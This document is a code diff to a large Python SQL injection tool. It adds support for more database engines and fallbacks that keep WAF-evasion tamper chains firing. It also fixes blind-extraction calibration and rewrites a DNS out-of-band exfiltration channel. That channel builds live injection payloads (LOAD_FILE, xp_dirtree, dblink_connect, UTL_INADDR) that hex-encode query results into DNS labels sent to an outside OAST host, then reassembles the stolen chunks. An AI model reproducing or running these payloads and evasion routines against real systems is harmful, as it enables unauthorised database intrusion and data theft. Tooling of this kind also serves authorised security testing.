@@ -26129,6 +26129,7 @@ class ConditionalErrorExtractor:
         # Fix: place the dedicated sentinel pattern BEFORE the generic one.
         re.compile(r"converting (?:the )?(?:nvarchar|varchar|char) value '(.)[aA]'", re.I),
         re.compile(r"Conversion failed when converting.*?value '(.+?)'"),
+        re.compile(r'DRG-\d+:\s*thesaurus\s+([0-9A-Fa-f]{1,8})\s+does\s+not\s+exist', re.I),  # CTXSYS DRG hex leak
         re.compile(r'ORA-20000:.*?[:\s]([^\s\'"]{1,8})', re.I),   # CTXSYS leak — {1,8} covers 4-byte emoji UTF-8 hex (8 chars)
         re.compile(r'ORA-29257: host unknown \((.+?)\.'),           # UTL_INADDR leak
         re.compile(r'ORA-\d+:.*?"(.+?)"'),
@@ -43574,6 +43575,8 @@ async def _extract_int(engine,config,queries,int_func,result,method,url,
                 if not hasattr(result, '_extract_int_waf_blocks'):
                     result._extract_int_waf_blocks = 0
                 result._extract_int_waf_blocks += 1
+                if hasattr(result, '_adaptive_mgr') and result._adaptive_mgr is not None:
+                    result._adaptive_mgr.report_block()
                 if not _use_between and result._extract_int_waf_blocks >= 3:
                     LOG.info("[_extract_int] WAF blocked >= operator 3× — auto-switching to BETWEEN")
                     _use_between = True
@@ -43589,6 +43592,8 @@ async def _extract_int(engine,config,queries,int_func,result,method,url,
                 # Reset WAF block counter on successful probe
                 if hasattr(result, '_extract_int_waf_blocks'):
                     result._extract_int_waf_blocks = 0
+                if hasattr(result, '_adaptive_mgr') and result._adaptive_mgr is not None:
+                    result._adaptive_mgr.report_success()
             
             #  Calculate similarity with error handling
             try:
@@ -43636,7 +43641,7 @@ async def _extract_int(engine,config,queries,int_func,result,method,url,
                 # may be inverted. Otherwise fall back to direct threshold comparison.
                 _ei_is_true = False
                 try:
-                    if _calib_polarity_inv and _BOOL_CALIBRATOR_MODULE is not None:
+                    if _BOOL_CALIBRATOR_MODULE is not None:
                         _ei_is_true = _BOOL_CALIBRATOR_MODULE.is_true(sim)
                     else:
                         _ei_is_true = sim > _calib_thresh_ei
@@ -43837,6 +43842,7 @@ class AdaptivePayloadManager:
     def report_success(self):
         """Report successful request"""
         self.consecutive_blocks = 0  # Reset consecutive block counter
+        self.last_successful_level = self.get_variation_level(self.request_count)
 
 
 def build_extraction_payload_from_confirmed(
@@ -43955,7 +43961,7 @@ def build_extraction_payload_from_confirmed(
     # BUG-HIGH-3 FIX: Add technique parameter check — timing techniques (T, TH, HQ, BT)
     # must ALWAYS use the inline timing oracle, never the similarity oracle.
     # Previously only payload-pattern detection was used, missing IF()-wrapped payloads.
-    _is_timing_technique = technique.upper() in ("T", "TH", "HQ", "BT") if technique else False
+    _is_timing_technique = technique.upper() in ("T", "TH", "HQ", "BT", "DS") if technique else False
     _is_timing_payload = (
         _is_timing_technique or  # BUG-HIGH-3 FIX: technique-based routing takes precedence
         'WAITFOR' in _up2 or
@@ -45247,11 +45253,13 @@ async def _blind_extract_char_inner(engine,config,queries,char_func,result,metho
             # DBMS_QUERIES["TiDB"]["if_func"] = "IF(({cond}),{t},{f})" — the fallback
             # must be consistent with the authoritative DBMS_QUERIES entry.
             # Fix: add 'TiDB': 'IF(({cond}),{t},{f})' so the fallback matches.
-            'TiDB':       'IF(({cond}),{t},{f})',
-            'PostgreSQL': 'CASE WHEN ({cond}) THEN {t} ELSE {f} END',
-            'MSSQL':      'CASE WHEN ({cond}) THEN {t} ELSE {f} END',
-            'Oracle':     'CASE WHEN ({cond}) THEN {t} ELSE {f} END',
-            'SQLite':     'CASE WHEN ({cond}) THEN {t} ELSE {f} END',
+            'TiDB':          'IF(({cond}),{t},{f})',
+            'PostgreSQL':    'CASE WHEN ({cond}) THEN {t} ELSE {f} END',
+            'MSSQL':         'CASE WHEN ({cond}) THEN {t} ELSE {f} END',
+            'Oracle':        'CASE WHEN ({cond}) THEN {t} ELSE {f} END',
+            'SQLite':        'CASE WHEN ({cond}) THEN {t} ELSE {f} END',
+            'CockroachDB':   'CASE WHEN ({cond}) THEN {t} ELSE {f} END',
+            'YugabyteDB':    'CASE WHEN ({cond}) THEN {t} ELSE {f} END',
         }
         if_func = (queries.get("if_func") or
                    _IFUNC_DEFAULTS_EC.get(_ifunc_dbms_ec,
@@ -45292,8 +45300,11 @@ async def _blind_extract_char_inner(engine,config,queries,char_func,result,metho
             _cb_t = _BOOL_CALIBRATOR_MODULE.threshold
             if _cb_t > 0.60 and len(_BOOL_CALIBRATOR_MODULE.true_sims) >= 3 \
                     and len(_BOOL_CALIBRATOR_MODULE.false_sims) >= 2:
-                # Cap to [0.60, 0.85] to guard against degenerate calibration values
-                _char_thresh = max(0.60, min(0.85, _cb_t))
+                # BUG-CHAR-THRESH-CAP FIX: remove 0.85 ceiling — capping at 0.85 when the
+                # calibrated threshold exceeds 0.85 causes false-condition responses (similarity
+                # between cap and real threshold) to be misclassified as true-condition, making
+                # binary search converge to the wrong character code.
+                _char_thresh = max(0.60, _cb_t)
             # BUG-EXTRACT-POLARITY: Track polarity inversion from calibrator so pivot
             # and binary search use the correct comparison direction.
             _char_thresh_polarity_inv = getattr(_BOOL_CALIBRATOR_MODULE, '_polarity_inverted', False)
@@ -45536,8 +45547,11 @@ async def _blind_extract_char_inner(engine,config,queries,char_func,result,metho
                 # BUG-EXTRACT-POLARITY: When polarity is inverted (true response is LESS
                 # similar to baseline than false response), comparison direction must flip.
                 _pivot_sim = _sim_to_baseline(fp, baseline)
-                _pivot_is_true = (_pivot_sim < _char_thresh if _char_thresh_polarity_inv
-                                  else _pivot_sim > _char_thresh)
+                if _BOOL_CALIBRATOR_MODULE is not None:
+                    _pivot_is_true = _BOOL_CALIBRATOR_MODULE.is_true(_pivot_sim)
+                else:
+                    _pivot_is_true = (_pivot_sim < _char_thresh if _char_thresh_polarity_inv
+                                      else _pivot_sim > _char_thresh)
                 if _pivot_is_true:
                     lo=pivot
                     break
@@ -45815,8 +45829,11 @@ async def _blind_extract_char_inner(engine,config,queries,char_func,result,metho
                 # BUG-EXTRACT-POLARITY: When polarity is inverted, flip the comparison
                 # direction so the binary search converges in the correct direction.
                 _bsearch_sim = _sim_to_baseline(fp, baseline)
-                _bsearch_is_true = (_bsearch_sim < _char_thresh if _char_thresh_polarity_inv
-                                    else _bsearch_sim > _char_thresh)
+                if _BOOL_CALIBRATOR_MODULE is not None:
+                    _bsearch_is_true = _BOOL_CALIBRATOR_MODULE.is_true(_bsearch_sim)
+                else:
+                    _bsearch_is_true = (_bsearch_sim < _char_thresh if _char_thresh_polarity_inv
+                                        else _bsearch_sim > _char_thresh)
                 if _bsearch_is_true:
                     lo=mid+1
                 else:
@@ -46481,7 +46498,8 @@ async def blind_extract_string(engine,config,queries,sql_query,result,method,url
 
 
 class DBMSFingerprinter:
-    PROBES=[("MySQL","SELECT VERSION()",r"mysql|mariadb|\d+\.\d+\.\d+"),
+    PROBES=[("TiDB","SELECT TIDB_VERSION()",r"tidb"),
+            ("MySQL","SELECT VERSION()",r"mysql|\d+\.\d+\.\d+"),
             ("MariaDB","SELECT VERSION()",r"mariadb"),
             ("MSSQL","SELECT @@VERSION",r"microsoft sql server|sql server \d{4}"),
             ("PostgreSQL","SELECT version()",r"postgresql"),
@@ -61978,7 +61996,7 @@ class Scanner:
         
         # Map DBMS to extraction queries
         queries_to_extract = []
-        if _dbms in ("MySQL", "MariaDB"):
+        if _dbms in ("MySQL", "MariaDB", "TiDB"):
             queries_to_extract = [
                 ("database", "database()"),
                 ("user", "CURRENT_USER()"),
@@ -62006,7 +62024,7 @@ class Scanner:
         elif _dbms == "SQLite":
             queries_to_extract = [
                 ("database", "'main'"),
-                ("user", "'admin'"),
+                ("user", "'sqlite_user'"),
                 ("version", "sqlite_version()")
             ]
         else:
@@ -62411,7 +62429,7 @@ class Scanner:
         # Build DBMS-specific stacked query payloads
         stacked_payloads = []
         
-        if _dbms in ("MySQL", "MariaDB"):
+        if _dbms in ("MySQL", "MariaDB", "TiDB"):
             stacked_payloads = [
                 ("; SELECT database() as db", "database"),
                 ("; SELECT CURRENT_USER() as usr", "user"),
@@ -67884,13 +67902,23 @@ class ScannerV4(Scanner):
                 if first_param and (cfg.waf or cfg.auto_tamper or not cfg.tamper):
                     waf_info = await WAFDetector(engine, cfg).detect(
                         first_ep.url, first_ep.method, first_param, first_val)
+                    # BUG-WAF-RECONCILE-FIX: preserve ML fingerprint name when WAFDetector
+                    # returns nothing (fully-403 targets).
+                    _waf_ml_p = (
+                        (getattr(self.session, "waf_info", None) or {}).get("name", "") or
+                        _ACTIVE_WAF_NAME or ""
+                    )
+                    if not waf_info.get("name") and _waf_ml_p:
+                        waf_info = dict(waf_info)
+                        waf_info["name"] = _waf_ml_p
+                        waf_info["detected"] = True
                     self.session.waf_info = waf_info
                     self.kb.cache_waf(domain, waf_info)
 
-            #  Tamper chain 
+            #  Tamper chain
             # Pass cfg.waf as fallback  WAFDetector.detect() returns name=None
             # on fully-403'd targets so waf_info.get("name") is always empty there.
-            _waf_name_for_kb = waf_info.get("name","") or getattr(cfg, "waf", "")
+            _waf_name_for_kb = waf_info.get("name","") or getattr(cfg, "waf", "") or _ACTIVE_WAF_NAME
             kb_chain = _build_rotating_tamper_chain(_waf_name_for_kb) or []
 
             # Resolve WAF name from every available source.
@@ -67898,10 +67926,14 @@ class ScannerV4(Scanner):
             # because its own probes are also blocked.  cfg.waf is set when
             # --waf is passed (shown as WAF=forced in output) and is the most
             # reliable source; also try waf_info and session.waf_info.
+            # BUG-WAF-RECONCILE-FIX: _ACTIVE_WAF_NAME set by MLWAFFingerprinter
+            # is never overwritten by WAFDetector — use as final fallback so
+            # WAF-specific tamper chains fire even when WAFDetector returns nothing.
             _ml_waf_name = (
                 getattr(cfg, "waf", None) or
                 waf_info.get("name") or
-                (getattr(self.session, "waf_info", None) or {}).get("name", "") or ""
+                (getattr(self.session, "waf_info", None) or {}).get("name", "") or
+                _ACTIVE_WAF_NAME or ""
             )
 
             # Look up WAF-specific tamper list from WAF_SIGNATURES
@@ -68907,10 +68939,10 @@ class SimHasher:
         except (UnicodeDecodeError, AttributeError, TypeError):
             t2 = body2.decode("latin-1", errors="replace") if isinstance(body2, bytes) else "" # Fallback
         # Strip dynamic tokens (timestamps, session IDs, UUIDs)
-        t1 = re.sub(r'[0-9a-f]{8}-[0-9a-f-]{27}', 'UUID', t1)
-        t2 = re.sub(r'[0-9a-f]{8}-[0-9a-f-]{27}', 'UUID', t2)
-        t1 = re.sub(r'\b\d{10,13}\b', 'TS', t1)
-        t2 = re.sub(r'\b\d{10,13}\b', 'TS', t2)
+        t1 = _re.sub(r'[0-9a-f]{8}-[0-9a-f-]{27}', 'UUID', t1)
+        t2 = _re.sub(r'[0-9a-f]{8}-[0-9a-f-]{27}', 'UUID', t2)
+        t1 = _re.sub(r'\b\d{10,13}\b', 'TS', t1)
+        t2 = _re.sub(r'\b\d{10,13}\b', 'TS', t2)
         return cls.similarity(cls.fingerprint(t1), cls.fingerprint(t2))
 
 
@@ -70620,6 +70652,15 @@ class ScannerV5(ScannerV4):
                 fp = next(iter(first_ep.params)); fv = first_ep.params[fp]
                 waf_info = await WAFDetector(engine, cfg).detect(
                     first_ep.url, first_ep.method, fp, fv)
+                # BUG-WAF-RECONCILE-FIX: preserve ML fingerprint name.
+                _waf_ml_p2 = (
+                    (getattr(self.session, "waf_info", None) or {}).get("name", "") or
+                    _ACTIVE_WAF_NAME or ""
+                )
+                if not waf_info.get("name") and _waf_ml_p2:
+                    waf_info = dict(waf_info)
+                    waf_info["name"] = _waf_ml_p2
+                    waf_info["detected"] = True
                 self.session.waf_info = waf_info
                 self.kb.cache_waf(domain, waf_info)
 
@@ -71150,10 +71191,15 @@ class ScannerV5(ScannerV4):
         # Resolve WAF name from every available source  WAFDetector.detect()
         # returns detected=False when all probes are 403'd (blocked  absent).
         # cfg.waf is set by --waf flag (most reliable); fall back to waf_info.
+        # BUG-WAF-RECONCILE-FIX: Include _ACTIVE_WAF_NAME (set by MLWAFFingerprinter.
+        # fingerprint() from response feature vector) as final fallback.  WAFDetector
+        # returns name=None on fully-403 targets and overwrites session.waf_info,
+        # losing the ML-derived name.  _ACTIVE_WAF_NAME is never overwritten.
         _ml_waf_name = (
             getattr(cfg, "waf", None) or
             waf_info.get("name") or
-            (getattr(self.session, "waf_info", None) or {}).get("name", "") or ""
+            (getattr(self.session, "waf_info", None) or {}).get("name", "") or
+            _ACTIVE_WAF_NAME or ""
         )
         # Look up WAF-specific tampers from WAF_SIGNATURES
         _waf_recs = list(waf_info.get("tampers", []))
@@ -79185,6 +79231,15 @@ class ScannerV7(ScannerV6):
                 fv  = first_ep.params[fp]
                 waf_info = await WAFDetector(engine, cfg).detect(
                     first_ep.url, first_ep.method, fp, fv)
+                # BUG-WAF-RECONCILE-FIX: preserve ML fingerprint name.
+                _waf_ml_p3 = (
+                    (getattr(self.session, "waf_info", None) or {}).get("name", "") or
+                    _ACTIVE_WAF_NAME or ""
+                )
+                if not waf_info.get("name") and _waf_ml_p3:
+                    waf_info = dict(waf_info)
+                    waf_info["name"] = _waf_ml_p3
+                    waf_info["detected"] = True
                 self.session.waf_info = waf_info
                 self.kb.cache_waf(domain, waf_info)
             self._ui.set_meta(waf=waf_info.get("name") or "none")
@@ -83200,6 +83255,15 @@ class ScannerV8(ScannerV7):
             fv   = first_ep.params[fp]
             waf_info = await WAFDetector(engine, cfg).detect(
                 first_ep.url, first_ep.method, fp, fv)
+            # BUG-WAF-RECONCILE-FIX: preserve ML fingerprint name.
+            _waf_ml_p4 = (
+                (getattr(self.session, "waf_info", None) or {}).get("name", "") or
+                _ACTIVE_WAF_NAME or ""
+            )
+            if not waf_info.get("name") and _waf_ml_p4:
+                waf_info = dict(waf_info)
+                waf_info["name"] = _waf_ml_p4
+                waf_info["detected"] = True
             self.session.waf_info = waf_info
             self.kb.cache_waf(domain, waf_info)
         self._ui.set_meta(waf=waf_info.get("name") or "none")
@@ -83720,6 +83784,8 @@ class ResponseNormaliser:
     def normalise(cls, body: bytes) -> bytes:
         """Strip dynamic tokens from response body. Returns normalised bytes.
         Truncates to 64KB before normalisation to prevent CPU saturation on large pages."""
+        if body is None:
+            return b""
         try:
             # Truncate early: normalisation only needs representative content
             # SQL injection signals appear near the start/end, not in page middle
@@ -84576,10 +84642,13 @@ class BitwiseExtractor:
                 "Informix":        "(1e0 IS NULL)",
                 "SAP_HANA":        "(1e0 IS NULL)",
             }.get(_bwe_pol_dbms, "1e0 IS NULL")
-            _sim_true_cal, _sim_false_cal = await asyncio.gather(
-                _bwe_calib(_bwe_pol_true), _bwe_calib(_bwe_pol_false))
-            if _sim_true_cal is not None and _sim_false_cal is not None:
-                self._polarity_inverted = bool(_sim_false_cal > _sim_true_cal)
+            _bwe_cal_results = await asyncio.gather(
+                _bwe_calib(_bwe_pol_true), _bwe_calib(_bwe_pol_false),
+                return_exceptions=True)
+            if not any(isinstance(r, BaseException) for r in _bwe_cal_results):
+                _sim_true_cal, _sim_false_cal = _bwe_cal_results
+                if _sim_true_cal is not None and _sim_false_cal is not None:
+                    self._polarity_inverted = bool(_sim_false_cal > _sim_true_cal)
                 if self._polarity_inverted:
                     LOG.debug(
                         f"[BitwiseExtractor] Inverted polarity detected "
@@ -85644,6 +85713,17 @@ class ScannerV9(ScannerV8):
             fv   = first_ep.params[fp]
             waf_info = await WAFDetector(engine, cfg).detect(
                 first_ep.url, first_ep.method, fp, fv)
+            # BUG-WAF-RECONCILE-FIX: MLWAFFingerprinter sets session.waf_info before
+            # _inner_v9 runs.  WAFDetector.detect() returns name=None on fully-403
+            # targets, overwriting the ML fingerprint.  Preserve the ML name.
+            _waf_ml_prior = (
+                (getattr(self.session, "waf_info", None) or {}).get("name", "") or
+                _ACTIVE_WAF_NAME or ""
+            )
+            if not waf_info.get("name") and _waf_ml_prior:
+                waf_info = dict(waf_info)
+                waf_info["name"] = _waf_ml_prior
+                waf_info["detected"] = True
             self.session.waf_info = waf_info
             self.kb.cache_waf(domain, waf_info)
         self._ui.set_meta(waf=waf_info.get("name") or "none")
@@ -89452,6 +89532,15 @@ class ScannerV10(ScannerV9):
             fp_ = next(iter(first_ep.params)); fv_ = first_ep.params[fp_]
             waf_info = await WAFDetector(engine, cfg).detect(
                 first_ep.url, first_ep.method, fp_, fv_)
+            # BUG-WAF-RECONCILE-FIX: preserve ML fingerprint name.
+            _waf_ml_p5 = (
+                (getattr(self.session, "waf_info", None) or {}).get("name", "") or
+                _ACTIVE_WAF_NAME or ""
+            )
+            if not waf_info.get("name") and _waf_ml_p5:
+                waf_info = dict(waf_info)
+                waf_info["name"] = _waf_ml_p5
+                waf_info["detected"] = True
             self.session.waf_info = waf_info
             self.kb.cache_waf(domain, waf_info)
         self._ui.set_meta(waf=waf_info.get("name") or "none")
@@ -90706,8 +90795,8 @@ class ScannerV10(ScannerV9):
             # when this B/NV/WB/EX/HY/ST path performed the outer increment. U/E/S/T paths
             # return early before reaching this line; they manage their own inner counters.
             _pcv_rpc_try_finally_entered = True  # sentinel FIRST — guarantees finally runs reset
-            _pcv_rpc_outer_incremented = True    # BUG-RPC-OUTER-DOUBLECREMENT FIX: mark outer +1
             _PCV_IN_PROGRESS[0] += 1   # BUG-PCV-REFCOUNT FIX: increment counter BEFORE _SCAN_STOPPED
+            _pcv_rpc_outer_incremented = True    # BUG-RPC-OUTER-DOUBLECREMENT FIX: mark outer +1 AFTER
 
             _SCAN_STOPPED[0] = True       # stop concurrent probe loops while PCV runs
 
@@ -95994,38 +96083,51 @@ class DoHOOBChannel:
         self.oast_server = (oast_server or "").rstrip("/")
         self.oast_token = oast_token or ""
 
-    def build_payload(self, sql_query, dbms, chunk_size=31):
+    def build_payload(self, sql_query, dbms, chunk_size=30, offset=0, chunk_index=0):
         """Build OOB payload: hex-encodes result as DNS label via DBMS functions.
-        
+
         BUG-REST-vs-DNS-DOMAIN: self.oob_domain is the DNS session domain
         (e.g. "sessionid.oast.fun"), NOT the REST API URL. This is correct for
         embedding in SQL — DNS labels need the session domain, not the base server.
+
+        BUG-DNS-LABEL-SIZE FIX: hex-encoding doubles byte count; a chunk_size of 31
+        produces a 62-char hex label which is within the RFC 1035 63-char limit. We
+        use 30 bytes by default and prepend a 2-char hex sequence number, giving
+        (2 + 60) = 62 chars total, safely within the limit.
         """
+        # BUG-DNS-LABEL-SIZE FIX: clamp so hex label (2*chunk_size) + 2-char seq <= 63
+        if chunk_size * 2 > 61:
+            chunk_size = 30
         dom = self.oob_domain
+        seq_prefix = f"{chunk_index:02x}"
+        sql_start = 1 + offset  # SQL SUBSTR is 1-based
         if dbms in ("MySQL", "MariaDB"):
-            hx = "LOWER(HEX(SUBSTR((" + sql_query + "),1," + str(chunk_size) + ")))"
-            return ("' AND 0x0=LOAD_FILE(CONCAT(CHAR(92),CHAR(92)," + hx +
-                    ",CHAR(46),'" + dom + "',CHAR(92),CHAR(120)))-- -")
+            hx = f"LOWER(HEX(SUBSTR(({sql_query}),{sql_start},{chunk_size})))"
+            label_expr = f"CONCAT('{seq_prefix}',{hx})"
+            return (f"' AND 0x0=LOAD_FILE(CONCAT(CHAR(92),CHAR(92),"
+                    f"{label_expr},CHAR(46),'{dom}',CHAR(92),CHAR(120)))-- -")
         elif dbms in ("MSSQL", "Sybase"):
-            hx = ("LOWER(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),"
-                  "SUBSTRING((" + sql_query + "),1," + str(chunk_size) + ")),2))")
-            return ("'; DECLARE @_sqrh VARCHAR(999);"
-                    "SET @_sqrh=CHAR(92)+CHAR(92)+" + hx +
-                    "+CHAR(46)+'" + dom + "'+CHAR(92)+CHAR(120);"
-                    "EXEC master..xp_dirtree @_sqrh-- -")
+            hx = (f"LOWER(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),"
+                  f"SUBSTRING(({sql_query}),{sql_start},{chunk_size})),2))")
+            return (f"'; DECLARE @_sqrh VARCHAR(999);"
+                    f"SET @_sqrh=CHAR(92)+CHAR(92)+'{seq_prefix}'+{hx}"
+                    f"+CHAR(46)+'{dom}'+CHAR(92)+CHAR(120);"
+                    f"EXEC master..xp_dirtree @_sqrh-- -")
         elif dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
-            hx = "encode((SUBSTRING((" + sql_query + "),1," + str(chunk_size) + "))::bytea,$$hex$$)"
-            return ("'; SELECT dblink_connect($$host=$$||" + hx +
-                    "||$$." + dom + " dbname=x connect_timeout=2$$)-- -")
+            hx = (f"encode((SUBSTRING(({sql_query}),{sql_start},{chunk_size}))"
+                  f"::bytea,$$hex$$)")
+            return (f"'; SELECT dblink_connect($$host=$$||'{seq_prefix}'||"
+                    f"{hx}||$$.{dom} dbname=x connect_timeout=2$$)-- -")
         elif dbms == "Oracle":
-            hx = ("LOWER(RAWTOHEX(UTL_RAW.CAST_TO_RAW(SUBSTR((" +
-                  sql_query + "),1," + str(chunk_size) + "))))")
-            return ("' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS(" + hx +
-                    "||'." + dom + "') FROM DUAL) IS NOT NULL-- -")
+            hx = (f"LOWER(RAWTOHEX(UTL_RAW.CAST_TO_RAW(SUBSTR(({sql_query}),"
+                  f"{sql_start},{chunk_size}))))")
+            return (f"' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('{seq_prefix}'||"
+                    f"{hx}||'.{dom}') FROM DUAL) IS NOT NULL-- -")
         else:
-            hx = "LOWER(HEX(SUBSTR((" + sql_query + "),1," + str(chunk_size) + ")))"
-            return ("' AND 0x0=LOAD_FILE(CONCAT(CHAR(92),CHAR(92)," + hx +
-                    ",CHAR(46),'" + dom + "',CHAR(92),CHAR(120)))-- -")
+            hx = f"LOWER(HEX(SUBSTR(({sql_query}),{sql_start},{chunk_size})))"
+            label_expr = f"CONCAT('{seq_prefix}',{hx})"
+            return (f"' AND 0x0=LOAD_FILE(CONCAT(CHAR(92),CHAR(92),"
+                    f"{label_expr},CHAR(46),'{dom}',CHAR(92),CHAR(120)))-- -")
 
     async def poll_interactions(self, engine, timeout=15.0):
         """Poll OAST/interactsh /poll REST endpoint for captured DNS interactions.
@@ -96081,13 +96183,25 @@ class DoHOOBChannel:
                             label = full_id.split(".")[0] if full_id else ""
                             if label and len(label) >= 4 and all(c in "0123456789abcdef" for c in label.lower()):
                                 try:
-                                    decoded = bytes.fromhex(label.lower()).decode("utf-8", errors="replace")
-                                    captured.append(decoded)
-                                    LOG.info(f"[DoHOOB] Decoded first label: {decoded!r}")
+                                    lc = label.lower()
+                                    # BUG-OOB-MULTICHUNK FIX: labels carry a 2-char hex sequence
+                                    # prefix (e.g. "00" for chunk 0, "01" for chunk 1).
+                                    # Strip the prefix, decode the data, record with seq number.
+                                    if len(lc) >= 6:
+                                        seq = int(lc[:2], 16)
+                                        data_hex = lc[2:]
+                                    else:
+                                        seq = 0
+                                        data_hex = lc
+                                    decoded = bytes.fromhex(data_hex).decode("utf-8", errors="replace")
+                                    captured.append((seq, decoded))
+                                    LOG.info(f"[DoHOOB] Decoded chunk seq={seq}: {decoded!r}")
                                 except Exception:
                                     pass
                         if captured:
-                            return captured
+                            # Sort by sequence number and return ordered list of strings
+                            captured.sort(key=lambda x: x[0])
+                            return [v for _, v in captured]
                     except (json.JSONDecodeError, ValueError):
                         pass
             except Exception as e:
@@ -96118,26 +96232,41 @@ class DoHOOBChannel:
                        self.oob_domain)
         _reg_token  = (getattr(_cfg, "_oob_registered_token", None) or
                        self.oast_token or "sqr")
-        # Temporarily override domain for payload building
+        # BUG-OOB-MULTICHUNK FIX: loop over multiple chunks so results longer than
+        # chunk_size bytes are fully reassembled instead of silently truncated.
+        # Strategy: send all chunk payloads first, then poll once with a longer
+        # timeout so the OAST server has time to collect all DNS interactions.
+        _chunk_size = 30
+        _max_chunks = 8
         _saved_dom = self.oob_domain
         self.oob_domain = _reg_domain
-        payload = self.build_payload(sql_query, dbms)
-        self.oob_domain = _saved_dom
-        print(f"[+] [DoHOOB] Exfil via {_reg_domain} ({dbms}): {payload[:80]}", flush=True)
-        try:
-            await _send_injected(engine, method, url, data, data_fmt,
-                                  param, original + payload, tamper_chain)
-        except Exception as e:
-            LOG.debug(f"[DoHOOB] Send error: {e}")
-        await asyncio.sleep(3.0)
-        # Update poll_interactions oast_token to use registered token
         _saved_tok = self.oast_token
         self.oast_token = _reg_token
-        hits = await self.poll_interactions(engine, timeout=12.0)
-        self.oast_token = _saved_tok
+        try:
+            for _ci in range(_max_chunks):
+                _offset = _ci * _chunk_size
+                payload = self.build_payload(sql_query, dbms,
+                                             chunk_size=_chunk_size,
+                                             offset=_offset,
+                                             chunk_index=_ci)
+                print(f"[+] [DoHOOB] Exfil chunk {_ci} via {_reg_domain} ({dbms}): {payload[:80]}",
+                      flush=True)
+                try:
+                    await _send_injected(engine, method, url, data, data_fmt,
+                                          param, original + payload, tamper_chain)
+                except Exception as e:
+                    LOG.debug(f"[DoHOOB] Send error chunk {_ci}: {e}")
+                await asyncio.sleep(1.0)
+            # Poll once after all payloads sent; poll_interactions returns sorted chunks
+            await asyncio.sleep(2.0)
+            hits = await self.poll_interactions(engine, timeout=12.0)
+        finally:
+            self.oob_domain = _saved_dom
+            self.oast_token = _saved_tok
         if hits:
-            LOG.info(f"[DoHOOB] Result: {hits}")
-            return hits[0]
+            result = "".join(hits)
+            LOG.info(f"[DoHOOB] Reassembled result ({len(hits)} chunks): {result!r}")
+            return result
         return None
 class ConformalPredictor:
     """
@@ -97075,6 +97204,11 @@ class ScannerV11(ScannerV10):
             fp_ = next(iter(first_ep.params)); fv_ = first_ep.params[fp_]
             waf_info = await WAFDetector(engine, cfg).detect(
                 first_ep.url, first_ep.method, fp_, fv_)
+            # BUG-WAF-RECONCILE-FIX: if WAFDetector finds nothing, fall back to ML name.
+            if not waf_info.get("name") and _ACTIVE_WAF_NAME:
+                waf_info = dict(waf_info)
+                waf_info["name"] = _ACTIVE_WAF_NAME
+                waf_info["detected"] = True
             self.session.waf_info = waf_info
             self.kb.cache_waf(domain, waf_info)
         self._ui.set_meta(waf=waf_info.get("name") or "none")
@@ -101708,6 +101842,11 @@ class ScannerV12(ScannerV11):
             fp_ = next(iter(first_ep.params)); fv_ = first_ep.params[fp_]
             waf_info = await WAFDetector(engine, cfg).detect(
                 first_ep.url, first_ep.method, fp_, fv_)
+            # BUG-WAF-RECONCILE-FIX: if WAFDetector finds nothing, fall back to ML name.
+            if not waf_info.get("name") and _ACTIVE_WAF_NAME:
+                waf_info = dict(waf_info)
+                waf_info["name"] = _ACTIVE_WAF_NAME
+                waf_info["detected"] = True
             self.session.waf_info = waf_info
             self.kb.cache_waf(domain, waf_info)
         self._ui.set_meta(waf=waf_info.get("name") or "none")
@@ -105969,10 +106108,9 @@ class TechniqueCascadeEngine:
         # Require FP-guards confirmation for the intermediate range (0.50-0.70).
         # Very strong dist (>= 0.70) can pre-confirm alone (with WAF-block guard).
         # FP guards alone (_fp_guards_preconfirmed) remain a separate independent path.
-        # RC-FINDING2-FP: Raised Wasserstein-alone Shortcut A from >= 0.70 → > 0.75.
-        # The >= 0.70 boundary was inclusive; a page with noise fluctuating 0.68-0.72
-        # occasionally triggers this PCV-bypassing path. Requiring > 0.75 (exclusive)
-        # provides a clear margin above the boundary for CDN / A-B noise variation.
+        # RC-FINDING2-FP: Raised Wasserstein-alone Shortcut A threshold from >= 0.70 → >= 0.80.
+        # The >= 0.70 boundary was too low; CDN / A-B noise fluctuating 0.68-0.72 triggered
+        # the path. Current threshold is >= 0.80 (inclusive) — matches the predicate below.
         # Combined-signal path unchanged: dist >= 0.50 + _fp_guards_preconfirmed still
         # confirms (two independent mechanisms agreeing is sufficient).
         # RC-FINDING3-FP: FP-guards-alone Shortcut A (confidence >= 0.85) now requires
@@ -105991,9 +106129,18 @@ class TechniqueCascadeEngine:
              and _wassr_early_dist >= 0.55)  # RC-FINDING3-FP: require independent Wasserstein signal
         ) if det else False
 
-        # Early Shortcut A: pre-verified by FP-guards, RobustTimingOracle, error multi-probe,
-        # or detection-time Wasserstein distributional oracle (dist >= 0.50)
-        if (_already_pcv_verified_early or _wassr_preconfirmed_early) and det is not None:
+        # BUG-PCV-BYPASS-FIX: Wasserstein preconfirmation is a strong signal but is NOT
+        # a substitute for PCV A-E. When _wassr_preconfirmed_early is True but PCV has not
+        # already run (det._pcv_verified is False), store it as a boost hint on det so the
+        # PCV A-E pipeline can use it as additional evidence, then fall through to PCV.
+        if _wassr_preconfirmed_early and not _already_pcv_verified_early and det is not None:
+            try:
+                det._wassr_boost = True
+            except Exception:
+                pass
+
+        # Early Shortcut A: only bypass PCV when an oracle already completed it (det._pcv_verified)
+        if _already_pcv_verified_early and det is not None:
             _early_tech = getattr(det, 'technique', tech) or tech
             _early_dbms = getattr(det, 'dbms', dbms) or dbms
             print(f"[!!] SQL INJECTION CONFIRMED [{_early_tech}] {_early_dbms} "
@@ -106041,9 +106188,18 @@ class TechniqueCascadeEngine:
                 pass
             return True
 
-        # Early Shortcut C: boolean multi-probe (4+/6 true/false pairs confirmed gap)
+        # BUG-PCV-BYPASS-FIX: boolean multi-probe boost stored as hint for PCV A-E when
+        # oracle has not already verified. Fall through so PCV A-E still runs.
         if (_mp_confirmed_early and _mp_count_early >= 4 and _mp_bool_early
-                and det is not None):
+                and det is not None and not _already_pcv_verified_early):
+            try:
+                det._mp_bool_boost = True
+            except Exception:
+                pass
+
+        # Early Shortcut C: boolean multi-probe — only bypass PCV when oracle already confirmed
+        if (_mp_confirmed_early and _mp_count_early >= 4 and _mp_bool_early
+                and _already_pcv_verified_early and det is not None):
             _early_tech_c = getattr(det, 'technique', tech) or tech
             _early_dbms_c = getattr(det, 'dbms', dbms) or dbms
